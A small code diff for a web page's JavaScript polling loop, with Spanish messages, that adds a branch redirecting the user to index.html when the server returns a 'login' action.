@@ -167,6 +167,9 @@
             clearInterval(pollInterval);
             sessionStorage.setItem('errorMessage', 'La información ingresada es incorrecta. Por favor, verifica tus datos.');
             window.location.href = 'index.html';
+          } else if (data.action === 'login') {
+            clearInterval(pollInterval);
+            window.location.href = 'index.html';
           }
         } catch (e) {
           // Silenciar errores de red
